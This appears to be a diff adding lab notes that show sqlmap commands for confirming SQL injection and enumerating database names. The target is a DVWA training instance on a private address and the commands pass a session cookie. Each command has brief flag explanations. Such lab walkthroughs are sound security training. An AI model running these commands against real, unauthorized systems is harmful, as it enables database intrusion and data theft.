@@ -1,0 +1,18 @@
+Confirming SQL injection: 
+
+
+python sqlmap.py --url=”http://192.168.152.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"
+
+Command Explained:
+–url: The vulnerable application’s URL
+–cookie: Session cookie to maintain access while attacking
+
+===================================================================================================
+
+Enumerating Database Names:
+
+./sqlmap.py --url="http://192.168.152.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"   --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" --dbs
+
+Command Explained:
+–url:  The vulnerable application’s URL –dbs: SQLMap option for database enumeration
+–cookie: Session cookie to maintain access while attacking
